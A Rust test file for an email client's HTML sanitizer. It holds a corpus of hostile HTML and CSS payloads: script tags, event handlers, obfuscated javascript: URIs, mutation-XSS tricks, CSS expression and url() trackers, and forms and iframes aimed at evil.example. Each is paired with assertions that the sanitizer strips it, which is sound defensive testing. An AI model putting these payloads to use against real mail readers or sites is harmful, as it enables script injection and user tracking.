//! Hostile HTML corpus. Each case states what must not survive.
use mailbox_mime::sanitize::{InlineImages, sanitize};

fn clean(html: &str) -> String {
    sanitize(html, &InlineImages::new()).html
}

#[test]
fn active_content_is_removed() {
    for (input, forbidden) in [
        ("<p>a</p><script>alert(1)</script>", vec!["script", "alert"]),
        (
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>ok",
            vec!["script", "evil"],
        ),
        ("<img src=x onerror=alert(1)>", vec!["onerror", "alert"]),
        (
            "<p onclick=\"steal()\" onmouseover='x()'>t</p>",
            vec!["onclick", "onmouseover", "steal"],
        ),
        ("<a href=\"javascript:alert(1)\">x</a>", vec!["javascript"]),
        (
            "<a href=\"JaVa\tScRiPt:alert(1)\">x</a>",
            vec!["script", "alert"],
        ),
        (
            "<a href=\" &#106;avascript:alert(1)\">x</a>",
            vec!["javascript"],
        ),
        ("<a href=\"vbscript:msgbox(1)\">x</a>", vec!["vbscript"]),
        (
            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
            vec!["data:", "script"],
        ),
        ("<a href=\"file:///etc/passwd\">x</a>", vec!["file:"]),
        (
            "<form action=\"https://evil.example\"><input name=p><button>go</button></form>",
            vec!["form", "input", "button", "evil"],
        ),
        (
            "<iframe src=\"https://evil.example\"></iframe>",
            vec!["iframe", "evil"],
        ),
        (
            "<object data=\"x.swf\"></object><embed src=\"x.swf\">",
            vec!["object", "embed", "swf"],
        ),
        (
            "<base href=\"https://evil.example/\">",
            vec!["base", "evil"],
        ),
        (
            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
            vec!["meta", "refresh", "evil"],
        ),
        (
            "<link rel=\"stylesheet\" href=\"https://evil.example/a.css\">",
            vec!["link", "evil"],
        ),
        (
            "<style>@import url(https://evil.example/a.css); p{background:url(https://evil.example/b)}</style>",
            vec!["style", "evil", "import"],
        ),
        (
            "<svg onload=alert(1)><script>alert(2)</script></svg>",
            vec!["svg", "onload", "alert"],
        ),
        (
            "<math><mtext><script>alert(1)</script></mtext></math>",
            vec!["script", "alert"],
        ),
        (
            "<video poster=\"https://evil.example/p\" src=\"https://evil.example/v\"></video><audio src=\"https://evil.example/a\">",
            vec!["video", "audio", "evil"],
        ),
        (
            "<body background=\"https://evil.example/bg\" onload=\"x()\"><p>t</p></body>",
            vec!["evil", "onload"],
        ),
        (
            "<img src=\"data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pg==\">",
            vec!["svg", "data:"],
        ),
        (
            "<img src=\"data:text/html;base64,PHNjcmlwdD4=\">",
            vec!["data:"],
        ),
        (
            "<a href=\"/relative/path\">x</a><img src=\"relative.png\">",
            vec!["relative"],
        ),
        (
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
            vec!["onerror"],
        ),
        (
            "<!-- <script>alert(1)</script> --><p>t</p>",
            vec!["script", "<!--"],
        ),
        (
            "<textarea><script>alert(1)</script></textarea>",
            vec!["script", "textarea"],
        ),
    ] {
        let out = clean(input).to_lowercase();
        for f in forbidden {
            assert!(
                !out.contains(f),
                "{f:?} survived in {out:?} (from {input:?})"
            );
        }
    }
}

#[test]
fn css_urls_are_removed_and_reported() {
    for input in [
        "<div style=\"background:url(https://t.example/p.gif)\">x</div>",
        "<div style=\"color:red;background-image: URL( 'http://t.example/p.gif' )\">x</div>",
        "<td background=\"https://t.example/bg.png\">x</td>",
        "<p style=\"list-style-image:url(//t.example/a)\">x</p>",
        "<p style=\"background:u\\72l(https://t.example/a)\">x</p>",
        "<p style=\"width:expression(alert(1))\">x</p>",
        "<p style=\"behavior:url(x.htc)\">x</p>",
        "<p style=\"background:image-set('https://t.example/a' 1x)\">x</p>",
        "<p style=\"font-family:'a;background:url(https://t.example/a);b'\">x</p>",
    ] {
        let s = sanitize(input, &InlineImages::new());
        let out = s.html.to_lowercase();
        for f in [
            "t.example",
            "url",
            "expression",
            "behavior",
            "image-set",
            "\\",
        ] {
            assert!(!out.contains(f), "{f:?} survived in {out:?}");
        }
        assert!(
            s.html_with_remote_images.is_none(),
            "only <img> may ever load: {input}"
        );
    }
    let s = sanitize(
        "<p style=\"color:red;background:url(https://t.example/p)\">x</p>",
        &InlineImages::new(),
    );
    assert!(s.remote_blocked);
    assert!(
        s.html.contains("color:red"),
        "harmless declarations stay: {}",
        s.html
    );
}

#[test]
fn remote_images_are_blocked_by_default_and_available_on_request() {
    let s = sanitize(
        "<p>Hi</p><img src=\"https://track.example/p.gif?id=1\" width=\"1\" alt=\"x\"><img srcset=\"https://track.example/2x.png 2x\" src=\"http://track.example/b.png\">",
        &InlineImages::new(),
    );
    assert!(s.remote_blocked);
    assert!(!s.html.contains("track.example") && !s.html.contains("src="));
    assert!(
        s.html.contains("alt=\"x\""),
        "the image element stays as a placeholder"
    );
    let with = s.html_with_remote_images.expect("opt-in variant");
    assert!(with.contains("src=\"https://track.example/p.gif?id=1\""));
    assert!(with.contains("src=\"http://track.example/b.png\""));
    assert!(!with.contains("srcset"), "only plain src is ever restored");
    // No remote image: nothing blocked, no second variant.
    let s = sanitize("<p>plain <b>bold</b></p>", &InlineImages::new());
    assert!(!s.remote_blocked && s.html_with_remote_images.is_none());
    assert_eq!(s.html, "<p>plain <b>bold</b></p>");
}

#[test]
fn links_keep_only_safe_schemes_and_get_rel() {
    let out = clean(
        "<a href=\"https://example.org/a?b=1&amp;c=2\" target=\"_top\" rel=\"opener\" ping=\"https://t.example\">w</a> <a href=\"mailto:a@example.org\">m</a> <a href=\"http://example.org\">h</a> <a href=\"ftp://example.org\">f</a> <a href=\"tel:123\">t</a>",
    );
    assert_eq!(out.matches("rel=\"noopener noreferrer\"").count(), 5);
    assert_eq!(out.matches("href=").count(), 3);
    assert!(out.contains("href=\"https://example.org/a?b=1&amp;c=2\""));
    assert!(
        out.contains("href=\"mailto:a@example.org\"")
            && out.contains("href=\"http://example.org\"")
    );
    for f in ["ftp:", "tel:", "ping", "target", "opener\"", "t.example"] {
        assert!(
            !out.contains(f) || f == "opener\"" && out.contains("noopener"),
            "{f} survived: {out}"
        );
    }
    assert!(!out.contains("rel=\"opener\""));
}

#[test]
fn inline_images_resolve_only_from_the_message() {
    let mut inline = InlineImages::new();
    inline.insert("logo@x".into(), "data:image/png;base64,AAAA".into());
    let s = sanitize(
        "<img src=\"cid:logo@x\"><img src=\"CID:other\"><img src=\"data:image/gif;base64,R0lGODlh\"><img src=\"data:image/png;base64,AA\" onload=\"x()\">",
        &inline,
    );
    assert!(s.html.contains("src=\"data:image/png;base64,AAAA\""));
    assert!(s.html.contains("src=\"data:image/gif;base64,R0lGODlh\""));
    assert!(
        !s.html.contains("cid:")
            && !s.html.to_lowercase().contains("other")
            && !s.html.contains("onload")
    );
    assert!(!s.remote_blocked);
}

#[test]
fn ordinary_formatting_survives() {
    let input = "<table width=\"600\" cellpadding=\"0\" bgcolor=\"#ffffff\"><tbody><tr><td align=\"center\" colspan=\"2\" style=\"font-size:14px;color:#333333\"><h1>T</h1><ul><li><em>a</em></li></ul><blockquote>q</blockquote><font color=\"red\" size=\"2\">f</font><br></td></tr></tbody></table>";
    let out = clean(input);
    for keep in [
        "<table",
        "width=\"600\"",
        "bgcolor=\"#ffffff\"",
        "colspan=\"2\"",
        "font-size:14px",
        "<h1>T</h1>",
        "<li><em>a</em></li>",
        "<blockquote>q</blockquote>",
        "<font color=\"red\" size=\"2\">",
        "<br>",
    ] {
        assert!(out.contains(keep), "{keep} lost: {out}");
    }
}

#[test]
fn pathological_documents_terminate() {
    let deep = format!("{}x{}", "<div>".repeat(20_000), "</div>".repeat(20_000));
    let _ = clean(&deep);
    let unclosed = "<table><tr><td><b><i><a href=\"https://e.example\">".repeat(5_000);
    let out = clean(&unclosed);
    assert!(!out.contains("script"));
    let _ = clean(&"<".repeat(100_000));
    let _ = clean("\u{0}<scr\u{0}ipt>alert(1)</scr\u{0}ipt>");
}

/// MB-304: a non-ASCII character across byte 32 of an image URL made the data-URI check slice
/// off a char boundary and panic, so the message could never be shown.
#[test]
fn multibyte_image_urls_do_not_panic_and_stay_blocked() {
    for n in 0..40 {
        let url = format!("http://a.example/{}\u{e9}\u{1f600}x", "a".repeat(n));
        let html = format!("<p>t</p><img src=\"{url}\"><img src=\"c\u{e9}d:x\">");
        let out = sanitize(&html, &InlineImages::new());
        assert!(out.html.contains("<p>t</p>"), "{n}");
        assert!(
            !out.html.contains("a.example"),
            "{n}: remote image must stay blocked"
        );
    }
    let data = format!(
        "<img src=\"data:image/png;base64,{}\u{e9}\">",
        "A".repeat(10)
    );
    assert!(!clean(&data).contains("data:"));
}

/// The reader lets a click navigate the top frame (AUDIT S-09), where the shell asks before
/// anything opens. That is only safe while a message cannot add another way to navigate.
#[test]
fn nothing_but_a_link_can_start_a_navigation() {
    let out = clean(
        "<base href=\"https://evil.example/\" target=\"_top\">\
         <meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\
         <form action=\"https://evil.example/\" target=\"_top\"><button formaction=\"https://evil.example/x\">go</button><input type=\"submit\"></form>\
         <svg><a xlink:href=\"https://evil.example/\">x</a></svg>\
         <map><area href=\"https://evil.example/\" target=\"_top\"></map>\
         <a href=\"https://example.org/ok\" target=\"_blank\" ping=\"https://evil.example/p\">ok</a>",
    )
    .to_lowercase();
    for gone in [
        "<base",
        "<meta",
        "<form",
        "<button",
        "<input",
        "formaction",
        "<svg",
        "xlink",
        "<area",
        "<map",
        "ping=",
        "target=",
        "evil.example",
    ] {
        assert!(!out.contains(gone), "{gone} survived: {out}");
    }
    assert!(out.contains("href=\"https://example.org/ok\""));
}
